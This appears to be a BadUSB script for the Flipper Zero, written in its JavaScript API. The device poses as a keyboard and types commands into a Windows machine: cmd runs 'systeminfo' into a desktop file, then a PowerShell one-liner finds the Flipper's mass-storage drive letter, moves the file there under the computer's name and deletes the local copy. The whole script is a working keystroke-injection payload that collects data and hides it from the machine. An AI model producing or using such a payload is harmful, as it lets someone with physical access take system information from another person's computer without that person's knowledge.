//
//Version 1.1
//Author: Christian Böö
//
//This Script collects System information and saves it as an txt-File on the Flipper Zero USB-Stick
//

//Requirements
let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");
let dialog = require("dialog");
//Infos zum USB-Image
let image = "/ext/apps_data/mass_storage/Cb.img";
let size = 8 * 1024 * 1024; // 8 MB
//Keyboard language settings
//ATTENTION MUST MATCH THE PC SETTINGS
let layout = "de-DE";

// Check if Image available
print("Search Image File...");
if (storage.exists(image)) {
    print("File exists.");
} else {
    print("Create Image...");
    usbdisk.createImage(image, size);
}

// Establish BadUSB connection with the layout defined under "layout"
badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero", layout_path: "/ext/badusb/assets/layouts/" + layout + ".kl" });
print("Wait for connection....");
while (!badusb.isConnected()) {
    delay(1000);
}

dialog.message("Collect System information?", "Press OK to start");

//Open Run
print ("Open run...");
badusb.press("GUI","r");
delay(500);

//Write cmd - an rund println
print ("Write CMD...");
badusb.println("cmd");
delay(500);

//go to Desktop
print ("Go to Desktop....");
badusb.println("cd Desktop");
delay (500);

//run systeminfo an write it into sysinfo.txt
print ("Collect information.....");
badusb.println("systeminfo > sysinfo.txt");
delay (5000);

//close cmd
print ("Close CMD.....");
badusb.press("ALT","F4");
delay (500);

//open powershell
print ("Open Powershell....");
badusb.press("GUI","r");
delay (500);
badusb.println("powershell");
delay (500);
//powershell now waits 30 seconds until the flipper usb stick has been loaded and determines the drive letter - copies the sysinfo.txt from the desktop to the stick and then deletes it from the desktop
//we have to disconnect the badusb and connect the stick
badusb.println("Start-Sleep 30; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter; Move-Item -Path C:\\Users\\${env:username}\\Desktop\\sysinfo.txt -Destination ${DriveLetter}:\\${env:computername}_sysinfo.txt; Remove-Item C:\\Users\\${env:username}\\Desktop\\sysinfo.txt; exit");
badusb.quit();
print ("Close Bad-USB connection....");
delay (2000);
usbdisk.start(image);
print ("Load USB-Stick....");
print ("If Powershell has been closed, please eject the USB.....");

while (!usbdisk.wasEjected()) {
    delay(1000);
}

// Stop
usbdisk.stop();
print("Done!");